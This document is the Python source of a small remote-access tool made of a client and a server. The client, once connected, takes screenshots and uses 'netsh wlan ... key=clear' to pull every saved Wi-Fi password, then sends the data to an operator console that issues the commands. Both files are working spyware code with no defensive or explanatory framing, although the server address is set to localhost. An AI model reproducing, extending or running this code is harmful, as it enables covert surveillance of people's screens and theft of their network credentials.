### Optimized clientv1.py ###

import socket
import os
import subprocess
import shlex
import re
import json
import datetime
import pyautogui
import tempfile
import base64

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 65432

def make_json_serializable(data):
    """Converts data into a JSON-serializable format."""
    if isinstance(data, bytes):
        return base64.b64encode(data).decode('utf-8')
    if isinstance(data, (list, tuple)):
        return [make_json_serializable(item) for item in data]
    if isinstance(data, dict):
        return {key: make_json_serializable(value) for key, value in data.items()}
    return data

def send_data(client_socket, data=None, file_name=None, is_real_time_data=False):
    """Sends data to the server."""
    try:
        serialized_data = json.dumps({
            "data": make_json_serializable(data),
            "data_type": str(type(data)),
            "file_name": file_name,
            "is_real_time_data": is_real_time_data
        }).encode('utf-8')

        length = len(serialized_data)
        client_socket.sendall(length.to_bytes(4, 'big'))
        client_socket.sendall(serialized_data)
        return True
    except Exception as e:
        print(f"Error sending data: {e}")
        return False

def receive_data(socket_connection):
    """Receives and deserializes JSON data from the server."""
    try:
        length = int.from_bytes(socket_connection.recv(4), 'big')
        json_data = b''
        while len(json_data) < length:
            json_data += socket_connection.recv(length - len(json_data))
        return json.loads(json_data.decode('utf-8'))
    except Exception as e:
        print(f"Error receiving data: {e}")
        return None

def screenshot():
    """Captures and returns a screenshot."""
    try:
        temp_dir = tempfile.gettempdir()
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d-%H-%M-%S')
        file_path = os.path.join(temp_dir, f'screenshot_{timestamp}.png')
        pyautogui.screenshot(file_path)
        with open(file_path, "rb") as img_file:
            return {"image": img_file.read(), "file_name": f'screenshot_{timestamp}.png'}
    except Exception as e:
        return f"Error taking screenshot: {e}"

def get_wifi_profiles():
    """Fetches available Wi-Fi profiles on the system."""
    try:
        result = subprocess.run(shlex.split('netsh wlan show profiles'), capture_output=True, text=True)
        return re.findall(r"All User Profile\s+:\s+(.*)", result.stdout)
    except Exception as e:
        return f"Error: {e}"

def get_wifi_passwords():
    """Fetches Wi-Fi passwords for all available profiles."""
    profiles = get_wifi_profiles()
    wifi_passwords = {}
    for profile in profiles:
        try:
            result = subprocess.run(shlex.split(f'netsh wlan show profiles name="{profile}" key=clear'), capture_output=True, text=True)
            match = re.search(r"Key Content\s+:\s+(.*)", result.stdout)
            wifi_passwords[profile] = match.group(1) if match else "Not found"
        except Exception as e:
            wifi_passwords[profile] = f"Error: {e}"
    return wifi_passwords

COMMANDS = {
    "screenshot": screenshot,
    "get_wifi_passwords": get_wifi_passwords
}

def execute_command(command):
    """Executes a given command and returns the response."""
    if command in COMMANDS:
        return COMMANDS[command]()
    return f"Invalid command: {command}"

def client_main():
    """Main function for the client application."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((SERVER_HOST, SERVER_PORT))
            print(f"Connected to server at {SERVER_HOST}:{SERVER_PORT}")

            while True:
                command = receive_data(client_socket).get("data")
                if command in ("exit", "quit"):
                    print("Connection closed by server.")
                    break

                response = execute_command(command)
                if command == "screenshot":
                    send_data(client_socket, data=response["image"], file_name=response["file_name"])
                else:
                    send_data(client_socket, data=response)
    except Exception as e:
        print(f"Client error: {e}")

if __name__ == "__main__":
    client_main()

### Optimized serverv1.py ###

import socket
import json
import base64

HOST = '127.0.0.1'
PORT = 65432
VALID_COMMANDS = ("screenshot", "get_wifi_passwords")

def send_data(client_socket, data):
    """Sends JSON data to the client."""
    try:
        serialized_data = json.dumps(data).encode('utf-8')
        client_socket.sendall(len(serialized_data).to_bytes(4, 'big'))
        client_socket.sendall(serialized_data)
        return True
    except Exception as e:
        print(f"Error sending data: {e}")
        return False

def receive_data(client_socket):
    """Receives JSON data from the client."""
    try:
        length = int.from_bytes(client_socket.recv(4), 'big')
        json_data = b''
        while len(json_data) < length:
            json_data += client_socket.recv(length - len(json_data))
        return json.loads(json_data.decode('utf-8'))
    except Exception as e:
        print(f"Error receiving data: {e}")
        return None

def start_server():
    """Starts the server and listens for client connections."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST, PORT))
        server_socket.listen(1)
        print(f"Server listening on {HOST}:{PORT}")
        client_socket, _ = server_socket.accept()
        print("Client connected.")
        handle_client(client_socket)

def handle_client(client_socket):
    """Handles client communication."""
    try:
        while True:
            command = input("Enter a command: ").strip()
            if command in ("exit", "quit"):
                send_data(client_socket, {"data": "exit"})
                break
            elif command in VALID_COMMANDS:
                send_data(client_socket, {"data": command})
                response = receive_data(client_socket)
                print(response.get("data", "No data received"))
            else:
                print(f"Invalid command: {command}")
    except Exception as e:
        print(f"Error handling client: {e}")
    finally:
        client_socket.close()

if __name__ == "__main__":
    start_server()
